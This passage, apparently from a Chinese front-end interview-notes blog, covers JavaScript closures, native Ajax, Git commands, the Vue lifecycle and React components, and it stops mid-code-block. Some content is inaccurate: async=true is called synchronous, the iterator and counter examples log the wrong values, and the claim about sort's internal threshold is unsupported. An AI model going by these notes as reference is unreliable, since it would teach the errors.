class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//常见的闭包形式：函数嵌套</span><br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">a</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> index=<span class=\"hljs-number\">0</span>;<br>    index=index+<span class=\"hljs-number\">1</span>;<br>    <br>    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">b</span>(<span class=\"hljs-params\"></span>)&#123;<br>        index=index+<span class=\"hljs-number\">2</span>;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(index);<br>    &#125;<br>    <br>    <span class=\"hljs-keyword\">return</span> b;<br>&#125;<br><br><span class=\"hljs-keyword\">var</span> c=<span class=\"hljs-title function_\">a</span>();\t\t\t<span class=\"hljs-comment\">//index=0+1; 将函数a赋值给全局变量c时，a会执行一次，局部变量index变为0+1，返回函数b；此时全局变量C为闭包函数b的引用；</span><br><span class=\"hljs-title function_\">c</span>();\t\t\t\t<span class=\"hljs-comment\">//index=0+1+2 //第一次执行c时，闭包函数b第一次执行；</span><br><span class=\"hljs-title function_\">c</span>();\t\t\t\t<span class=\"hljs-comment\">//index=0+1+2+2 //第二次执行c时，闭包函数b第二次执行；</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"特点：\"><a href=\"#特点：\" class=\"headerlink\" title=\"特点：\"></a>特点：</h5><ul>\n<li>被闭包函数访问的父级以上函数的局部变量会一致存在于内存中，不会被JS的垃圾回收机制回收；</li>\n<li>闭包函数u实现了对其他函数内部变量的访问；</li>\n</ul>\n<h5 id=\"JS垃圾回收机制：\"><a href=\"#JS垃圾回收机制：\" class=\"headerlink\" title=\"JS垃圾回收机制：\"></a>JS垃圾回收机制：</h5><ul>\n<li>如果一个对象不再被引用，这个对象会被GC回收；</li>\n<li>如果两个对象相互引用，而不再被第三者所引用，那么这两个对象都会被收回；</li>\n</ul>\n<h5 id=\"闭包的用途：\"><a href=\"#闭包的用途：\" class=\"headerlink\" title=\"闭包的用途：\"></a>闭包的用途：</h5><ul>\n<li>访问函数内部的变量；</li>\n<li>让变量始终保持在内存中；</li>\n</ul>\n<h5 id=\"应用场景：\"><a href=\"#应用场景：\" class=\"headerlink\" title=\"应用场景：\"></a>应用场景：</h5><ul>\n<li>模拟面向对象的代码风格</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name</span>)&#123;<br>    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Say</span>(<span class=\"hljs-params\">content</span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name+<span class=\"hljs-string\">&quot;:&quot;</span>+content);<br>    &#125;<br>    <br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title class_\">Say</span>;<br>&#125;<br><br>a=<span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;martin&quot;</span>);<br>b=<span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;jacy&quot;</span>);<br><span class=\"hljs-title function_\">a</span>(<span class=\"hljs-string\">&quot;What are u doing ?&quot;</span>);<br><span class=\"hljs-title function_\">b</span>(<span class=\"hljs-string\">&quot;Nothing&quot;</span>);<br><span class=\"hljs-title function_\">a</span>(<span class=\"hljs-string\">&quot;Hang out with me ?&quot;</span>);<br><span class=\"hljs-title function_\">b</span>(<span class=\"hljs-string\">&quot;To there?&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>使用<code>setTimeout</code>支持传参(通过闭包实现setTimeout第一个函数传参)</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">func</span>(<span class=\"hljs-params\">param</span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(param);<br>    &#125;<br>&#125;<br><br><span class=\"hljs-keyword\">var</span> f1=<span class=\"hljs-title function_\">func</span>(<span class=\"hljs-number\">1</span>);<br><span class=\"hljs-built_in\">setTimeout</span>(f1,<span class=\"hljs-number\">1000</span>);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>封装私有变量：通过闭包定义能访问私有函数和私有变量的共有函数</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> counter=(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> privateCounter=<span class=\"hljs-number\">0</span>;   <span class=\"hljs-comment\">//私有变量</span><br><br>    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">change</span>(<span class=\"hljs-params\">val</span>)&#123;<br>        privateCounter+=val;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">return</span> &#123;<br>        <span class=\"hljs-attr\">increment</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-title function_\">change</span>(<span class=\"hljs-number\">1</span>);<br>        &#125;,<br>        <span class=\"hljs-attr\">decrement</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-title function_\">change</span>(-<span class=\"hljs-number\">1</span>);<br>        &#125;,<br>        <span class=\"hljs-attr\">value</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-keyword\">return</span> privateCounter;<br>        &#125;<br>    &#125;;<br>&#125;)();<br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">value</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">increment</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">increment</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">increment</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">increment</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(counter.<span class=\"hljs-title function_\">value</span>());<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>模拟块作用域</li>\n</ul>\n<p><img src=\"https://img-blog.csdnimg.cn/764a7d4d2f244f3dbb50fa59da6105eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyd6ZizMzk=,size_15,color_FFFFFF,t_70,g_se,x_16\" alt=\"在这里插入图片描述\"></p>\n<blockquote>\n<p>onclick绑定的function中没有变量i，解析引擎会寻找父级作用域，最终找到全局变量i；for循环结束的时，i的值已经变成了4；所以此时任何onclick点击都会弹出4；</p>\n<p>也可使用let i=0;来解决；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> elements=<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementsByTagName</span>(<span class=\"hljs-string\">&#x27;li&#x27;</span>);<br><span class=\"hljs-keyword\">var</span> length=elements.<span class=\"hljs-property\">length</span>;<br><br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">var</span> i=<span class=\"hljs-number\">0</span>;i&lt;length;i++)&#123;<br>    elements[i].<span class=\"hljs-property\">onclick</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">num</span>)&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(num);<br>        &#125;<br>    &#125;(i);           <span class=\"hljs-comment\">//通过匿名闭包，把每次的i保存到一个变量中实现了效果</span><br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>实现迭代器</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">setup</span>(<span class=\"hljs-params\">x</span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> i=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-keyword\">return</span> x[i++];<br>    &#125;;<br>&#125;<br><span class=\"hljs-keyword\">var</span> next=<span class=\"hljs-title function_\">setup</span>([<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>]);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(next);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(next);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(next);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"闭包优点：\"><a href=\"#闭包优点：\" class=\"headerlink\" title=\"闭包优点：\"></a>闭包优点：</h5><ul>\n<li>减少全局变量的定义，避免全局变量污染；</li>\n<li>能够读取函数内部的变量；</li>\n<li>内存中维护一个变量，用作缓存；</li>\n</ul>\n<h5 id=\"闭包缺点：\"><a href=\"#闭包缺点：\" class=\"headerlink\" title=\"闭包缺点：\"></a>闭包缺点：</h5><ul>\n<li>造成内存泄漏，闭包会使函数中的变量一致保存在内存中，内存消耗极大；</li>\n</ul>\n<p>解决方法：使用完毕以后设置为null；</p>\n<ul>\n<li>闭包可能在父函数外部，改变父函数内部的值；</li>\n<li>由于闭包设计跨作用域访问，会导致性能损失；</li>\n</ul>\n<p>解决方法：通过跨作用域变量存储在局部变量中，直接访问局部变量来减轻对执行素的的影响；</p>\n<h3 id=\"9-如何实现原生ajax？\"><a href=\"#9-如何实现原生ajax？\" class=\"headerlink\" title=\"9.如何实现原生ajax？\"></a>9.如何实现原生ajax？</h3><blockquote>\n<p>Ajax是异步的JS和XML，是一种在无需重新加载整个网页的情况下，更新部分网页的技术；</p>\n</blockquote>\n<ul>\n<li>创建XMLHttpRequest对象；</li>\n</ul>\n<blockquote>\n<p>老版本的浏览器用的ActiveX对象；</p>\n<p>现代浏览器使用XMLHttpRequest对象；</p>\n</blockquote>\n<ul>\n<li>向服务器发送请求；</li>\n</ul>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs oxygene\">open(<span class=\"hljs-keyword\">method</span>,<span class=\"hljs-title function_\">url</span>,<span class=\"hljs-title function_\">async</span>)\t\t//请求类型，<span class=\"hljs-title function_\">url</span>位置，<span class=\"hljs-title function_\">true</span>同步<br><span class=\"hljs-title function_\">send</span>（<span class=\"hljs-title function_\">string</span>）\t\t\t//仅用于<span class=\"hljs-title function_\">POST</span>；<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>服务器响应；</li>\n</ul>\n<blockquote>\n<p>1.responseText   字符串形式的数据响应；</p>\n<p>2.responseXML  XML形式的数据响应；</p>\n</blockquote>\n<ul>\n<li>判断是否成；</li>\n</ul>\n<blockquote>\n<p>1.onreadystatechange    存储函数，每当readystate属性改变时调用；</p>\n<p>2.readyState              存有XMLHttpRequest的状态；0初始化，1连接建立，2请求已接受，3请求处理中，4请求已完成；</p>\n<p>3.status            200 ok   404 Page not found;</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//原生Ajax</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">oriAjax</span>(<span class=\"hljs-params\">url,</span>)&#123;<br>    <span class=\"hljs-comment\">//判断浏览器版本</span><br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">XMLHttpRequest</span>)&#123;<br>        <span class=\"hljs-keyword\">var</span> ajaxRequest=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">XMLHttpRequest</span>();<br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">var</span> ajaxRequest=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ActiveXObject</span>(<span class=\"hljs-string\">&quot;Microsoft.XMLHTTP&quot;</span>);<br>    &#125;<br><br>    ajaxRequest.<span class=\"hljs-title function_\">open</span>(<span class=\"hljs-string\">&quot;GET&quot;</span>,url,<span class=\"hljs-literal\">true</span>);<br><br>    ajaxRequest.<span class=\"hljs-property\">onreadystatechange</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-keyword\">if</span>(ajaxRequest.<span class=\"hljs-property\">readyState</span>==<span class=\"hljs-number\">4</span> &amp;&amp; ajaxRequest.<span class=\"hljs-property\">status</span>==<span class=\"hljs-number\">200</span>)&#123;<br>            <span class=\"hljs-comment\">//更新dom结点</span><br>            <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">&quot;myDiv&quot;</span>).<span class=\"hljs-property\">innerHTML</span>=ajaxRequest.<span class=\"hljs-property\">responseText</span>;<br>        &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ajaxRequest.<span class=\"hljs-property\">response</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"10-JS排序算法底层原理？\"><a href=\"#10-JS排序算法底层原理？\" class=\"headerlink\" title=\"10.JS排序算法底层原理？\"></a>10.JS排序算法底层原理？</h3><p>sort（）数组长度小于22使用插入排序，大于22快排；</p>\n<h3 id=\"11-nextTick\"><a href=\"#11-nextTick\" class=\"headerlink\" title=\"11.nextTick\"></a>11.nextTick</h3><h1 id=\"Git相关\"><a href=\"#Git相关\" class=\"headerlink\" title=\"Git相关\"></a>Git相关</h1><p><a href=\"https://worktile.com/kb/ask/20275.html\">https://worktile.com/kb/ask/20275.html</a></p>\n<h3 id=\"1-常见命令流程\"><a href=\"#1-常见命令流程\" class=\"headerlink\" title=\"1.常见命令流程\"></a>1.常见命令流程</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">初始化仓库</span><br>git init  <br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">切换到主分支</span><br>git checkout master<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">获取最新变更</span><br>git fetch origin<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">基于主分支创建dev分支</span><br>git checkout -b dev origin/master<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">添加到缓存</span><br>git add<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">提交到本地仓库</span><br>git commit -m &quot;备注&quot;<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">获取最新更新</span><br>git fetch origin<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-其他指令\"><a href=\"#2-其他指令\" class=\"headerlink\" title=\"2.其他指令\"></a>2.其他指令</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">查看仓库状态</span><br>git status<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">将某个工作区的文件添加暂存区</span><br>git add filename   或 git add . 全部<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">查看工作区和暂存区差异</span><br>git diff 分支/id/<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">查看历史记录</span><br>git log<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">代码回滚</span><br>git reset HEAD^  <br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">删除版本库文件</span><br>git rm filename<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">同步远程仓库</span><br>git push -u origin master<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">本地仓库推送到远程仓库</span><br>git remote add origin git@github.com:username/仓库名.git<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">克隆</span><br>git clone url<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">合并分支</span><br>git merge dev<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">删除分支</span><br>git branch -d dev<br><br><br><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"NodeJS相关\"><a href=\"#NodeJS相关\" class=\"headerlink\" title=\"NodeJS相关\"></a>NodeJS相关</h1><h3 id=\"1-node流\"><a href=\"#1-node流\" class=\"headerlink\" title=\"1.node流\"></a>1.node流</h3><h3 id=\"2-node如何写接口？\"><a href=\"#2-node如何写接口？\" class=\"headerlink\" title=\"2.node如何写接口？\"></a>2.node如何写接口？</h3><h3 id=\"3-express\"><a href=\"#3-express\" class=\"headerlink\" title=\"3.express\"></a>3.express</h3><h3 id=\"4-node常用模块\"><a href=\"#4-node常用模块\" class=\"headerlink\" title=\"4.node常用模块\"></a>4.node常用模块</h3><h1 id=\"VUE相关\"><a href=\"#VUE相关\" class=\"headerlink\" title=\"VUE相关\"></a>VUE相关</h1><h3 id=\"1-Vue生命周期\"><a href=\"#1-Vue生命周期\" class=\"headerlink\" title=\"1.Vue生命周期\"></a>1.Vue生命周期</h3><p><img src=\"https://cn.vuejs.org/assets/lifecycle.16e4c08e.png\" alt=\"组件生命周期图示\"></p>\n<ul>\n<li>beforeCreate:实例初始化完成，props解析之后，data()和computed等选项处理之前立即调用；此时不能获得DOM结点；</li>\n<li>created：Vue实例已经创建，响应式数据、计算属性、方法和侦听器已经设置完成；但是由于没有挂载，依旧不能获得DOM结点；</li>\n<li>beforeMount：组件内容被渲染拿到页面之前执行的函数，组件已经完成了其响应式状态的设置，但是还没有创建DOM结点；</li>\n<li>mounted：组件渲染之后自动执行，一般异步请求写这里；这个阶段数据和DOM都已经完成渲染；</li>\n<li>beforeUpdate：数据变化的时候执行的函数，此时变化后的数据还未渲染到页面上；</li>\n<li>updated：数据变化以后执行，变化的数据已经渲染到页面上；</li>\n<li>beforeUnmount：当Vue应用被销毁时，自动执行的函数；</li>\n<li>unmounted：当vue应用销毁后，且DOM完全销毁之后自动执行；</li>\n</ul>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/24919918-2b75253c04f7b643.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp\" alt=\"img\"></p>\n<h3 id=\"2-路由守卫\"><a href=\"#2-路由守卫\" class=\"headerlink\" title=\"2.路由守卫\"></a>2.路由守卫</h3><h3 id=\"3-组件通信有哪些？\"><a href=\"#3-组件通信有哪些？\" class=\"headerlink\" title=\"3.组件通信有哪些？\"></a>3.组件通信有哪些？</h3><p><a href=\"https://blog.csdn.net/longfan_/article/details/125324201\">https://blog.csdn.net/longfan_/article/details/125324201</a></p>\n<blockquote>\n<p>一般分为如下关系：</p>\n<p>父子间通信；</p>\n<p>非父子间通信（兄弟，隔代）；</p>\n</blockquote>\n<ul>\n<li>props / $emit</li>\n</ul>\n<blockquote>\n<p>父组件通过props的方式向子组件传递数据，而通过$emit子组件可以像父组件通信；</p>\n<p>props只可以从上一级组件传递到下一级组件，即所谓的单向数据流，而且props只读，不可被修改，所有修改都会失效并警告；</p>\n<p>一、不应该在一个组组件内部改变prop，会破坏单向数据绑定；</p>\n</blockquote>\n<ul>\n<li></li>\n</ul>\n<h3 id=\"4-v-if与show区别\"><a href=\"#4-v-if与show区别\" class=\"headerlink\" title=\"4.v-if与show区别\"></a>4.v-if与show区别</h3><h3 id=\"5-VUE与React区别\"><a href=\"#5-VUE与React区别\" class=\"headerlink\" title=\"5.VUE与React区别\"></a>5.VUE与React区别</h3><h3 id=\"6-Vue-DIff算法\"><a href=\"#6-Vue-DIff算法\" class=\"headerlink\" title=\"6.Vue DIff算法\"></a>6.Vue DIff算法</h3><h3 id=\"7-Vue如何实现监听？\"><a href=\"#7-Vue如何实现监听？\" class=\"headerlink\" title=\"7.Vue如何实现监听？\"></a>7.Vue如何实现监听？</h3><h1 id=\"React相关\"><a href=\"#React相关\" class=\"headerlink\" title=\"React相关\"></a>React相关</h1><h3 id=\"1-类组件和函数组件\"><a href=\"#1-类组件和函数组件\" class=\"headerlink\" title=\"1.类组件和函数组件\"></a>1.类组件和函数组件</h3><ul>\n<li><h5 id=\"函数组件\"><a href=\"#函数组件\" class=\"headerlink\" title=\"函数组件\"></a>函数组件</h5></li>\n</ul>\n<blockquote>\n<p>使用JS函数创建的组件；</p>\n<p>首字母大写，React根据此区分组件和HTML元素；</p>\n<p>函数必须有返回值,不渲染内容需要返回null；</p>\n</blockquote>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs jsx\"><span class=\"hljs-comment\">//普通函数</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Header</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>头部组件<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br>&#125;<br><span class=\"hljs-comment\">//箭头函数</span><br><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title function_\">Footer</span>=(<span class=\"hljs-params\"></span>)=&gt;&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>Rooter<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><h5 id=\"类组件\"><a href=\"#类组件\" class=\"headerlink\" title=\"类组件\"></a>类组件</h5></li>\n</ul>\n<blockquote>\n<p>使用class语法创建的组件；</p>\n<p>首字母大写，必须继承React.Component父类；</p>\n<p>必须有render函数，返回UI结构，可返回null;</p>\n</blockquote>\n<h5 id=\"状态组件：\"><a href=\"#状态组件：\" class=\"headerlink\" title=\"状态组件：\"></a>状态组件：</h5><ul>\n<li>无状态组件不定义状态，没有组件生命周期，只负责渲染UI，Hooks出现后函数组件也可以有状态；性能较好；</li>\n<li>有状态组件可以定义自己的状态，拥有生命周期，能力更强；</li>\n</ul>\n<h5 id=\"类组件问题：\"><a href=\"#类组件问题：\" class=\"headerlink\" title=\"类组件问题：\"></a>类组件问题：</h5><ul>\n<li>处理this问题：绑定箭头函数、bind，声明箭头函数</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Component</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&quot;react&quot;</span>;<br> <br><span 